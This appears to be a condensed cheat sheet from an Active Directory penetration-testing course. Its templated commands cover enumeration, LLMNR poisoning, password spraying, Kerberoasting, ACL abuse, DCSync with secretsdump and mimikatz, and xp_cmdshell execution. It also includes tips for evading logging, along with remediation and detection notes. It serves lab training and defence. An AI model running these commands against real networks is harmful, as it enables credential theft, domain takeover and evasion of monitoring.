## Introduction to Active Directory Enumeration & Attacks

AD enumeration and attacks module: gain a foothold, enumerate credentialed and uncredentialed, and escalate to domain compromise using native tools and common offensive tooling, from both Linux and Windows.

### Connecting to Lab Hosts

```bash
xfreerdp /v:<TARGET_IP> /u:<USERNAME> /p:<PASSWORD> # RDP to Windows host
```

```bash
ssh <USERNAME>@<TARGET_IP> # SSH to Linux host
```

Tools live in `C:\Tools` on Windows attack hosts, and in `/opt` or the PATH on Linux attack hosts.

## Tools of the Trade

Tools referenced throughout the module.

`PowerView`/`SharpView` situational awareness, PowerShell/.NET net* replacement | `BloodHound` maps AD relationships/attack paths from collector data | `SharpHound` C# collector, outputs JSON for BloodHound | `BloodHound.py` Python ingestor (Impacket-based), works from non-domain-joined hosts

`Kerbrute` Kerberos pre-auth user enum/spray (Go) | `Impacket` Python toolkit for AD protocol attacks | `Responder` poisons LLMNR/NBT-NS/MDNS | `Inveigh`/`InveighZero` PowerShell/C# LLMNR/NBT-NS poisoning

`rpcinfo` lists RPC services on a host (`-p`) | `rpcclient` Samba RPC enumeration | `CrackMapExec` (CME/NetExec) enum/attack/post-ex over SMB/WMI/WinRM/MSSQL | `Rubeus` C# Kerberos abuse

`GetUserSPNs.py` Impacket Kerberoasting | `Hashcat` hash cracking | `enum4linux`/`enum4linux-ng` Windows/Samba enumeration | `ldapsearch` built-in LDAP client

`windapsearch` Python LDAP enumeration (users/groups/computers) | `DomainPasswordSpray.ps1` PowerShell password spray | `LAPSToolkit` audit/attack LAPS-enabled hosts | `smbmap` SMB share enum

`psexec.py` Impacket PsExec-like semi-interactive shell | `wmiexec.py` Impacket command exec over WMI | `Snaffler` finds credentials/sensitive data on accessible shares | `smbserver.py` quick SMB server for file transfer

`setspn.exe` manage SPNs on a service account | `Mimikatz` pass-the-hash, plaintext password extraction, Kerberos ticket extraction | `secretsdump.py` remote SAM/LSA secrets dump | `evil-winrm` interactive WinRM shell

`mssqlclient.py` Impacket MSSQL client | `noPac.py` CVE-2021-42278 + CVE-2021-42287 combo, standard user to DA | `rpcdump.py` Impacket RPC endpoint mapper | `CVE-2021-1675.py` PrintNightmare PoC

`ntlmrelayx.py` Impacket SMB relay | `PetitPotam.py` CVE-2021-36942 PoC, coerces auth via MS-EFSRPC | `gettgtpkinit.py` cert-to-TGT | `getnthash.py` NT hash via Kerberos U2U

`adidnsdump` dumps AD-integrated DNS zone records | `gpp-decrypt` decrypts GPP cpassword | `GetNPUsers.py` Impacket ASREPRoasting | `lookupsid.py` SID bruteforce

`ticketer.py` builds/customizes TGT/TGS (Golden Ticket, trust attacks) | `raiseChild.py` automated child-to-parent domain escalation | `Active Directory Explorer` AD viewer/editor, offline snapshots | `PingCastle` AD security scoring/maturity audit

`Group3r` audits GPOs for misconfigurations | `ADRecon` bulk AD data extraction to Excel/CSV

## External Recon and Enumeration Principles

Passive/active OSINT to validate scope and gather usernames, infrastructure, and breach data before internal testing.

### Resources

`BGP.he.net` ASN/netblock lookup | `viewdns.info` reverse IP/DNS, WHOIS | `domaintools` domain/DNS data | `HaveIBeenPwned` breach check | `Dehashed` cleartext creds/hashes from breaches | `linkedin2username` username mashups from LinkedIn | `Trufflehog` secrets in Git repos | `Greyhat Warfare` exposed S3 buckets

### DNS

```bash
nslookup <HOSTNAME>
```

### Google Dorks

```text
filetype:pdf inurl:<DOMAIN>
intext:"@<DOMAIN>" inurl:<DOMAIN>
```

### Dehashed

```bash
sudo python3 dehashed.py -q <DOMAIN> -p
```

## Initial Enumeration of the Domain

Enumerate hosts, users, and services from an unauthenticated position before obtaining credentials.

### Identifying Hosts

```bash
sudo -E wireshark # passive capture
sudo tcpdump -i <INTERFACE> # passive capture, no GUI
sudo responder -I <INTERFACE> -A # analyze mode, passive LLMNR/NBT-NS/MDNS listen
```

```bash
fping -asgq <TARGET_CIDR> # a: alive only, s: stats, g: generate from CIDR, q: quiet
```

```bash
sudo nmap -v -A -iL hosts.txt -oN <OUTPUT_FILE>
```

`-A` runs OS/version/script detection in one pass.

### Identifying Users

Kerberos pre-auth enumeration is rarely logged and does not lock out accounts (unlike spraying).

```bash
git clone https://github.com/ropnop/kerbrute.git
cd kerbrute && make all # or: make linux/windows/mac
sudo mv dist/kerbrute_linux_amd64 /usr/local/bin/kerbrute
kerbrute userenum -d <TARGET_DOMAIN> --dc <DC_IP> <WORDLIST> -o <OUTPUT_FILE>
```

Wordlists: `jsmith.txt`, `jsmith2.txt` (statistically-likely-usernames repo).

### Identifying Potential Vulnerabilities

SYSTEM on a domain-joined host impersonates the computer account, nearly equivalent to a domain user.

Routes to SYSTEM: MS08-067, EternalBlue, BlueKeep, SeImpersonate abuse (Juicy Potato), local 0-days, PsExec with local admin. With SYSTEM: enumerate AD, Kerberoast/ASREPRoast, run Responder/Inveigh, token impersonation, ACL attacks.

## LLMNR/NBT-NS Poisoning - from Linux

MITM poisoning of name-resolution broadcasts to capture NetNTLM hashes. LLMNR UDP 5355, NBT-NS UDP 137.

Responder needs free: UDP 137,138,53,389 TCP 1433 UDP 1434 TCP 80,135,139,445,21,3141,25,110,587,3128 Multicast UDP 5355,5353.

```bash
sudo responder -I <INTERFACE> -A # analyze/passive mode
sudo responder -I <INTERFACE> # poison LLMNR/NBT-NS/MDNS, default settings
```

`-w` WPAD rogue proxy | `-f` fingerprint OS | `-v` verbose | `-F`/`-P` force NTLM/Basic auth, may trigger a login prompt

Hashes logged to `/usr/share/responder/logs` as `(MODULE)-(HASH_TYPE)-(CLIENT_IP).txt`, one printed to console unless `-v`.

```bash
hashcat -m 5600 <HASH_FILE> <WORDLIST> # NetNTLMv2
```

NetNTLMv2 cannot be pass-the-hash; must crack offline.

### Remediation

Disable LLMNR: Computer Configuration > Administrative Templates > Network > DNS Client > "Turn OFF Multicast Name Resolution". NBT-NS has no GPO toggle; push via startup script.

```powershell
$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}
```

Also: filter LLMNR/NetBIOS traffic, enable SMB signing, network segmentation.

### Detection

MITRE T1557.001. Inject LLMNR/NBT-NS requests for non-existent hosts across subnets and alert on replies. Monitor UDP 5355/137, event IDs 4697 and 7045, and registry `HKLM\Software\Policies\Microsoft\Windows NT\DNSClient` value `EnableMulticast` (0 = disabled).

## LLMNR/NBT-NS Poisoning - from Windows

Inveigh: PowerShell/C# poisoning tool for Windows, equivalent to Responder.

```powershell
Import-Module .\Inveigh.ps1
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

```powershell
.\Inveigh.exe # C# version (InveighZero); press ESC for interactive console
```

`GET NTLMV2` all hashes | `GET NTLMV2UNIQUE` one per user | `GET NTLMV2USERNAMES` captured usernames/hosts | `GET CLEARTEXT` cleartext creds | `STOP` stop Inveigh

## Password Spraying Overview

Attempts one common password against many usernames; spray, not brute force, to avoid lockouts.

Common policy: 5 bad attempts before lockout, 30 min auto-unlock. Without a known policy, wait hours between attempts, or do one "hail mary" spray. Log every target, DC used, and password tried.

## Enumerating & Retrieving Password Policies

Password policy tells safe spray-attempt counts and informs password-list crafting.

### Credentialed - Linux

```bash
crackmapexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> --pass-pol
```

### SMB NULL Session - Linux

```bash
rpcclient -U "" -N <TARGET_IP>
```

```text
rpcclient $> querydominfo
rpcclient $> getdompwinfo
```

```bash
enum4linux -P <TARGET_IP>
enum4linux-ng -P <TARGET_IP> -oA <OUTPUT_FILE> # adds JSON/YAML output
```

`nmblookup` 137/UDP | `nbtstat` 137/UDP | `net` 139/TCP,135/TCP | `rpcclient` 135/TCP | `smbclient` 445/TCP

### NULL Session - Windows

```cmd
net use \\<DC_HOSTNAME>\ipc$ "" /u:""
```

### LDAP Anonymous Bind - Linux

Legacy config; anonymous LDAP binds can pull full user/group/policy data.

```bash
ldapsearch -H ldap://<TARGET_IP> -x -b "DC=<DOMAIN>,DC=<TLD>" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

`-h` flag deprecated in favor of `-H` in newer ldapsearch versions.

### Windows - Credentialed

```cmd
net accounts
```

```powershell
Import-Module .\PowerView.ps1
Get-DomainPolicy
```

### Default Domain Policy

`history` 24 | `max age` 42 days | `min age` 1 day | `min length` 7 | `complexity` enabled | `reversible encryption` disabled | `lockout duration` not set | `lockout threshold` 0

## Password Spraying - Making a Target User List

Valid users can come from SMB NULL sessions, LDAP anonymous bind, Kerbrute enumeration, or existing credentials.

```bash
enum4linux -U <TARGET_IP> | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

```text
rpcclient $> enumdomusers
```

```bash
crackmapexec smb <TARGET_IP> --users # unauth (NULL session)
crackmapexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> --users # credentialed, shows badpwdcount/baddpwdtime
```

Accounts near the lockout threshold (`badpwdcount`) should be dropped from the spray list. Multiple DCs keep separate counters; query the PDC Emulator for an accurate total.

```bash
ldapsearch -H ldap://<TARGET_IP> -x -b "DC=<DOMAIN>,DC=<TLD>" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
```

```bash
./windapsearch.py --dc-ip <DC_IP> -u "" -U # anonymous bind, list users
```

Track per attempt: targeted accounts, DC used, date/time, password(s) tried.

## Internal Password Spraying - from Linux

Spray the gathered user list against one password, checking for valid logins without exceeding the lockout threshold.

```bash
for u in $(cat valid_users.txt);do rpcclient -U "$u%<PASSWORD>" -c "getusername;quit" <TARGET_IP> | grep Authority; done
```

```bash
kerbrute passwordspray -d <TARGET_DOMAIN> --dc <DC_IP> valid_users.txt <PASSWORD>
```

```bash
sudo crackmapexec smb <TARGET_IP> -u valid_users.txt -p <PASSWORD> | grep + # filter hits
sudo crackmapexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> # validate a hit
```

### Local Administrator Password Reuse

Gold-image deployments often reuse one local admin password/hash across many hosts.

```bash
sudo crackmapexec smb --local-auth <TARGET_CIDR> -u administrator -H <HASH> | grep +
```

`--local-auth` forces one attempt per host (no domain lockout risk); omitting it risks locking the domain account.

## Internal Password Spraying - from Windows

DomainPasswordSpray automates user-list generation, policy lookup, and near-lockout exclusion when run from a domain-joined host.

```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password <PASSWORD> -OutFile <OUTPUT_FILE> -ErrorAction SilentlyContinue
```

### Mitigations

MFA on external portals | restrict app access to users who need it | separate admin accounts, network segmentation | password filters blocking dictionary words/seasons/company name

### Detection

Event ID 4625 (SMB spray, many failures in a short window) | Event ID 4771 Kerberos pre-auth failed (LDAP spray, requires Kerberos logging enabled)

## Enumerating Security Controls

Check AV/EDR, AppLocker, language mode, and LAPS before choosing tools and techniques.

```powershell
Get-MpComputerStatus # Windows Defender status (RealTimeProtectionEnabled, etc.)
```

```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

Orgs often block only `%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe`, missing SysWOW64 or `PowerShell_ISE.exe`.

```powershell
$ExecutionContext.SessionState.LanguageMode # FullLanguage vs ConstrainedLanguage
```

### LAPS - LAPSToolkit

```powershell
Find-LAPSDelegatedGroups # groups delegated read rights to LAPS passwords
Find-AdmPwdExtendedRights # users/groups with All Extended Rights (can read LAPS pw)
Get-LAPSComputers # LAPS-enabled hosts, expiration, cleartext password if readable
```

## Credentialed Enumeration - from Linux

Deeper enumeration of users, groups, shares, and hosts once valid domain credentials are obtained.

### CrackMapExec

```bash
sudo crackmapexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> --users
sudo crackmapexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> --groups
sudo crackmapexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> --loggedon-users
sudo crackmapexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> --shares
sudo crackmapexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> -M spider_plus --share '<SHARE>' # list readable files
```

`(Pwn3d!)` = user is local admin on target. spider_plus output: `/tmp/cme_spider_plus/<TARGET_IP>.json`.

### SMBMap

```bash
smbmap -u <USERNAME> -p <PASSWORD> -d <TARGET_DOMAIN> -H <TARGET_IP>
smbmap -u <USERNAME> -p <PASSWORD> -d <TARGET_DOMAIN> -H <TARGET_IP> -R '<SHARE>' --dir-only
```

### rpcclient

```bash
rpcclient -U "" -N <TARGET_IP> # NULL session
```

```text
rpcclient $> queryuser <RID_HEX>
rpcclient $> enumdomusers
```

RID (hex) + domain SID = full object SID. Built-in Administrator RID is always `0x1f4` (500).

### Impacket - psexec.py / wmiexec.py

Requires local admin creds on the target.

```bash
psexec.py <TARGET_DOMAIN>/<USERNAME>:'<PASSWORD>'@<TARGET_IP>
```

Uploads a service exe to ADMIN$, runs as SYSTEM via a named pipe.

```bash
wmiexec.py <TARGET_DOMAIN>/<USERNAME>:'<PASSWORD>'@<TARGET_IP>
```

Runs as the connecting user (not SYSTEM), drops no files, but spawns a new cmd.exe per command (event 4688) — stealthier but not silent.

### Windapsearch

```bash
python3 windapsearch.py --dc-ip <DC_IP> -u <USERNAME>@<TARGET_DOMAIN> -p <PASSWORD> --da # Domain Admins members
python3 windapsearch.py --dc-ip <DC_IP> -u <USERNAME>@<TARGET_DOMAIN> -p <PASSWORD> -PU # privileged users, recursive nested groups
```

### BloodHound.py

```bash
sudo bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -ns <DC_IP> -d <TARGET_DOMAIN> -c all
```

`-c` collection methods: Group, LocalAdmin, Session, Trusts, DCOnly, ObjectProps, ACL, All, etc. Outputs `<date>_<object>.json`.

```bash
sudo neo4j start
zip -r <OUTPUT_FILE>.zip *.json
bloodhound # launch GUI, upload the zip
```

## Credentialed Enumeration - from Windows

Same goal from a Windows attack host: built-in AD module, PowerView, SharpView, Snaffler, SharpHound/BloodHound.

### ActiveDirectory PowerShell Module

```powershell
Import-Module ActiveDirectory
Get-ADDomain
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName # Kerberoastable accounts
Get-ADTrust -Filter * # domain/forest trusts
Get-ADGroup -Filter * | select name
Get-ADGroup -Identity "<GROUP>"
Get-ADGroupMember -Identity "<GROUP>"
```

### PowerView

```powershell
Import-Module .\PowerView.ps1
```

`Get-Domain` current domain object | `Get-DomainController` list DCs | `Get-DomainUser` users | `Get-DomainComputer` computers | `Get-DomainGroup` groups | `Get-DomainOU` OUs | `Find-InterestingDomainAcl` non-default ACL modify rights | `Get-DomainGroupMember` group members | `Get-DomainFileServer` likely file servers | `Get-DomainGPO` GPOs | `Get-DomainPolicy` default/DC domain policy | `Get-NetLocalGroup`/`Get-NetLocalGroupMember` local groups | `Get-NetShare` open shares | `Get-NetSession` session info | `Test-AdminAccess` admin-rights check | `Find-DomainUserLocation` where a user is logged in | `Find-DomainShare` reachable shares | `Find-InterestingDomainShareFile` search readable shares | `Find-LocalAdminAccess` hosts where current user is local admin | `Get-DomainTrust`/`Get-ForestTrust`/`Get-DomainTrustMapping` trust enum | `Get-DomainForeignUser`/`Get-DomainForeignGroupMember` cross-domain membership | `ConvertTo-SID` name to SID | `Get-DomainSPNTicket` request TGS for an SPN | `Export-PowerViewCSV` append results to CSV

```powershell
Get-DomainUser -Identity <USERNAME> -Domain <TARGET_DOMAIN> | Select-Object name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
Get-DomainGroupMember -Identity "<GROUP>" -Recurse # resolves nested group membership
Get-DomainTrustMapping
Test-AdminAccess -ComputerName <COMPUTER>
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

### SharpView

.NET port of PowerView for hosts where PowerShell is restricted.

```powershell
.\SharpView.exe Get-DomainUser -Help
.\SharpView.exe Get-DomainUser -Identity <USERNAME>
```

### Snaffler

Crawls domain shares for credentials and sensitive files.

```powershell
Snaffler.exe -s -d <TARGET_DOMAIN> -o <OUTPUT_FILE> -v data
```

### BloodHound - SharpHound

```powershell
.\SharpHound.exe -c All --zipfilename <OUTPUT_FILE>
```

Upload the zip in the BloodHound GUI (`bloodhound` to launch, neo4j backend). Useful built-in queries: Find Computers with Unsupported Operating Systems, Find Computers where Domain Users are Local Admin, Find Shortest Paths to Domain Admins.

## Living Off the Land

Native Windows tools/commands for enumeration when unable to pull in external tooling; also stealthier (fewer logs/alerts).

### Host & Network Recon

`hostname` PC name | `systeminfo` OS/patch/domain summary in one command | `wmic qfe get Caption,Description,HotFixID,InstalledOn` patches | `ipconfig /all` adapters | `echo %USERDOMAIN%` current domain | `echo %logonserver%` DC this host checks into

### PowerShell

```powershell
Get-Module # loaded modules
Get-ExecutionPolicy -List
Set-ExecutionPolicy Bypass -Scope Process # reverts when the process exits, non-permanent
Get-ChildItem Env: | ft Key,Value
Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt # PS history, may hold passwords
```

#### PowerShell Downgrade (opsec)

```powershell
powershell.exe -version 2
```

PowerShell v3+ added Script Block Logging; v2 does not log script blocks. The downgrade command itself is logged in the Windows PowerShell event log, but commands run after are not.

### Checking Defenses

```cmd
netsh advfirewall show allprofiles
sc query windefend
```

```powershell
qwinsta # check who else is logged on before acting
```

### Network Info

```powershell
arp -a # hosts known to this interface
route print # routing table; listed networks are pivot candidates
```

### WMI

```powershell
wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List
wmic process list /format:list
wmic ntdomain list /format:list # domain + DC info, including child/trust domains
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list # service accounts
wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
```

### Net Commands

```cmd
net accounts /domain
net group /domain
net group "Domain Admins" /domain
net group "Domain Controllers" /domain
net group <GROUP> /domain
net localgroup administrators /domain
net user <USERNAME> /domain
net user /domain
net view /domain
```

Use `net1` instead of `net` to dodge naive string-based command monitoring.

### Dsquery

Ships with the AD DS role; `dsquery.dll` exists on modern Windows by default (`C:\Windows\System32\dsquery.dll`).

```powershell
dsquery user
dsquery computer
dsquery * "CN=Users,DC=<DOMAIN>,DC=<TLD>" # wildcard search of an OU
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl # PASSWD_NOTREQD flag set
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName # Domain Controllers
```

### LDAP Filtering

`1.2.840.113556.1.4.803` exact bit match | `1.2.840.113556.1.4.804` any bit in the chain matches | `1.2.840.113556.1.4.1941` matches through the DN ownership/membership chain

Logical operators: `&` and | `|` or | `!` not

```text
(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))
```

## Kerberoasting - from Linux

Any domain user can request a TGS for any SPN account; the ticket is encrypted with the service account's NTLM hash and can be cracked offline for the cleartext password. Requires domain user creds/hash or SYSTEM.

```bash
sudo python3 -m pip install . # Impacket, from cloned repo dir
```

```bash
GetUserSPNs.py -dc-ip <DC_IP> <TARGET_DOMAIN>/<USERNAME> # list SPN accounts
GetUserSPNs.py -dc-ip <DC_IP> <TARGET_DOMAIN>/<USERNAME> -request # request all TGS tickets
GetUserSPNs.py -dc-ip <DC_IP> <TARGET_DOMAIN>/<USERNAME> -request-user <TARGET_USER> -outputfile <OUTPUT_FILE>
```

```bash
hashcat -m 13100 <OUTPUT_FILE> <WORDLIST>
```

## Kerberoasting - from Windows

Kerberoasting from a Windows host: manual ticket extraction, PowerView, Rubeus, and RC4 vs AES considerations.

### Semi-Manual

```cmd
setspn.exe -Q */*
```

```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>" # requests TGS, loads into memory
```

```text
mimikatz # base64 /out:true
mimikatz # kerberos::list /export
```

Without `base64 /out:true`, tickets are written to disk as `.kirbi` files instead.

```bash
echo "<BASE64_BLOB>" | tr -d \\n
cat encoded_file | base64 -d > <OUTPUT_FILE>.kirbi
python2.7 kirbi2john.py <OUTPUT_FILE>.kirbi # writes crack_file
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > <OUTPUT_FILE>_hashcat
hashcat -m 13100 <OUTPUT_FILE>_hashcat <WORDLIST>
```

### PowerView

```powershell
Get-DomainUser * -spn | select samaccountname
Get-DomainUser -Identity <USERNAME> | Get-DomainSPNTicket -Format Hashcat
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\<OUTPUT_FILE>.csv -NoTypeInformation
```

### Rubeus

```powershell
.\Rubeus.exe kerberoast /stats # kerberoastable user count + supported enc types
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap # target privileged accounts
.\Rubeus.exe kerberoast /user:<USERNAME> /nowrap /outfile:<OUTPUT_FILE>
.\Rubeus.exe kerberoast /usetgtdeleg # request RC4 for AES accounts via tgtdeleg
.\Rubeus.exe kerberoast /rc4opsec # tgtdeleg + skip AES-enabled accounts
```

`/nowrap` prevents column-wrapped output (needed for Hashcat). `/tgtdeleg` does not downgrade encryption against Server 2019 DCs; they always return the account's highest supported type.

### Encryption Types

```powershell
Get-DomainUser <USERNAME> -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

`msDS-SupportedEncryptionTypes` `0` default, RC4_HMAC_MD5 | `24` AES128/256 only

```bash
hashcat -m 13100 <HASH_FILE> <WORDLIST> # RC4, type 23
hashcat -m 19700 <HASH_FILE> <WORDLIST> # AES-256, type 18, far slower to crack
```

### Mitigation & Detection

Use gMSA/MSA for service accounts (auto-rotating complex passwords); otherwise enforce long passphrases. Monitor Event ID 4769 (TGS requested) and 4770 (renewed) via "Audit Kerberos Service Ticket Operations"; a burst of 4769 for one account is anomalous (10-20 is normal). Encryption type `0x17` in the event = RC4 (crackable if the password is weak).

## Access Control List (ACL) Abuse Primer

DACL defines who can access an object and at what level; made of ACEs (allow/deny per principal). SACL logs access attempts. No DACL = everyone full access; a DACL with no ACEs = everyone denied. Checked top to bottom, stops at the first deny.

`ForceChangePassword` abused with `Set-DomainUserPassword` | `Add Members` abused with `Add-DomainGroupMember` | `GenericAll` abused with `Set-DomainUserPassword`/`Add-DomainGroupMember` | `GenericWrite` abused with `Set-DomainObject` | `WriteOwner` abused with `Set-DomainObjectOwner` | `WriteDACL` abused with `Add-DomainObjectACL` | `AllExtendedRights` abused with `Set-DomainUserPassword`/`Add-DomainGroupMember` | `AddSelf` abused with `Add-DomainGroupMember`

`ForceChangePassword` reset a user's password without knowing the current one. `GenericWrite` write any non-protected attribute — over a user, assign an SPN for Kerberoasting; over a group, add members; over a computer, enables RBCD. `AddSelf` shows groups a user can add themself to. `GenericAll` full control — modify group membership, force password change, targeted Kerberoast, or (with LAPS) read the local admin password.

## ACL Enumeration

Pivot ACL searches from a controlled principal instead of dumping every ACL in the domain.

### PowerView - Targeted Search

```powershell
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid <USERNAME>
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} # human-readable ActiveDirectoryRights/ObjectAceType
```

Without `-ResolveGUIDs`, `ObjectAceType` shows a raw GUID.

```powershell
Get-DomainGroup -Identity "<GROUP>" | select memberof # check nested group membership for inherited rights
```

Pivot methodology: take each newly-controlled user/group's SID and repeat `Get-DomainObjectACL -ResolveGUIDs`, following nested group membership, until reaching a privileged target (e.g. DCSync rights `DS-Replication-Get-Changes` / `DS-Replication-Get-Changes-In-Filtered-Set`).

### Without PowerView

```powershell
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
foreach($line in [System.IO.File]::ReadLines("ad_users.txt")) {get-acl "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match '<TARGET_DOMAIN>\\<USERNAME>'}}
```

Much slower than PowerView, but works with only built-in cmdlets.

### Resolving a Raw GUID

```powershell
$guid = "<GUID>"
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * | Select Name,DisplayName,DistinguishedName,rightsGuid | ?{$_.rightsGuid -eq $guid} | fl
```

### BloodHound

Set a controlled user as the start node, open Node Info > Outbound Control Rights (First Degree / Transitive Object Control). Right-click an edge between two nodes > Help for abuse steps, opsec notes, and references.

## ACL Abuse Tactics

Example chain: force-change a password via `ForceChangePassword`, use `GenericWrite` to join a group, inherit `GenericAll` via nested membership, then abuse `GenericAll` for a targeted Kerberoast or DCSync.

```powershell
$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<TARGET_DOMAIN>\<USERNAME>', $SecPassword)
$TargetPassword = ConvertTo-SecureString '<NEW_PASSWORD>' -AsPlainText -Force
Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity <TARGET_USERNAME> -AccountPassword $TargetPassword -Credential $Cred -Verbose
```

Linux equivalent: `pth-net` (pth-toolkit).

```powershell
Add-DomainGroupMember -Identity '<GROUP>' -Members '<USERNAME>' -Credential $Cred2 -Verbose
Get-DomainGroupMember -Identity "<GROUP>" | Select MemberName # confirm
```

### Targeted Kerberoasting via GenericAll

Use when the target's password can't be reset (e.g. an account that can't be interrupted); assign a fake SPN instead.

```powershell
Set-DomainObject -Credential $Cred2 -Identity <TARGET_USERNAME> -SET @{serviceprincipalname='<FAKE_SPN>'} -Verbose
.\Rubeus.exe kerberoast /user:<TARGET_USERNAME> /nowrap
```

Linux: `targetedKerberoast` creates, roasts, and removes the temporary SPN in one command.

### Cleanup

Remove the fake SPN before leaving the group that grants the rights to do so.

```powershell
Set-DomainObject -Credential $Cred2 -Identity <TARGET_USERNAME> -Clear serviceprincipalname -Verbose
Remove-DomainGroupMember -Identity "<GROUP>" -Members '<USERNAME>' -Credential $Cred2 -Verbose
```

### Detection

Event ID 5136 (directory service object modified) logs ACL changes as SDDL.

```powershell
ConvertFrom-SddlString "<SDDL_STRING>" | select -ExpandProperty DiscretionaryAcl
```

## DCSync

Abuses the `Directory Replication Service Remote Protocol` (impersonating a DC) via `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` extended rights to pull NTLM hashes for any user. Domain/Enterprise Admins have this by default; standard users can be granted it.

```powershell
Get-DomainUser -Identity <USERNAME> | select samaccountname,objectsid,memberof,useraccountcontrol | fl
```

```powershell
$sid = "<USER_SID>"
Get-ObjectAcl "DC=<DOMAIN>,DC=<TLD>" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

```bash
secretsdump.py -outputfile <OUTPUT_FILE> -just-dc <TARGET_DOMAIN>/<USERNAME>@<DC_IP>
```

`-just-dc-ntlm` NTLM hashes only | `-just-dc-user <USERNAME>` single user | `-pwd-last-set` show last-set dates | `-history` dump password history | `-user-status` flag disabled accounts

Writes `<OUTPUT_FILE>.ntds`, `.ntds.kerberos`, `.ntds.cleartext` (cleartext only for accounts with reversible encryption enabled).

```powershell
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl # reversible-encryption accounts
```

### Mimikatz

Must run in the context of the DCSync-capable user.

```cmd
runas /netonly /user:<TARGET_DOMAIN>\<USERNAME> powershell
```

```text
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:<TARGET_DOMAIN> /user:<TARGET_DOMAIN>\<TARGET_USER>
```

## Privileged Access

Lateral movement without local admin: RDP, WinRM (PSRemoting), or MSSQL sysadmin access. BloodHound edges: `CanRDP` | `CanPSRemote` | `SQLAdmin`.

```powershell
Get-NetLocalGroupMember -ComputerName <COMPUTER> -GroupName "Remote Desktop Users"
Get-NetLocalGroupMember -ComputerName <COMPUTER> -GroupName "Remote Management Users"
```

### Cypher Queries (BloodHound)

```text
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

### WinRM

```powershell
$password = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
$cred = new-object System.Management.Automation.PSCredential ("<TARGET_DOMAIN>\<USERNAME>", $password)
Enter-PSSession -ComputerName <COMPUTER> -Credential $cred
```

```bash
gem install evil-winrm
evil-winrm -i <TARGET_IP> -u <USERNAME>
```

### MSSQL

```powershell
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain
Get-SQLQuery -Verbose -Instance "<TARGET_IP>,<PORT>" -username "<TARGET_DOMAIN>\<USERNAME>" -password "<PASSWORD>" -query 'Select @@version'
```

```bash
mssqlclient.py <TARGET_DOMAIN>/<USERNAME>@<TARGET_IP> -windows-auth
```

```text
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami /priv
```

`SeImpersonatePrivilege` on the SQL service account enables SYSTEM escalation via JuicyPotato/PrintSpoofer/RoguePotato.

## Kerberos "Double Hop" Problem

WinRM/PowerShell Kerberos auth forwards a TGS for the first hop only, not the TGT, so a second hop (e.g. the DC) can't validate the session. Unaffected by hosts with unconstrained delegation.

### Workaround 1: PSCredential Object

Works from evil-winrm; must pass `-Credential` on every call that needs the second hop.

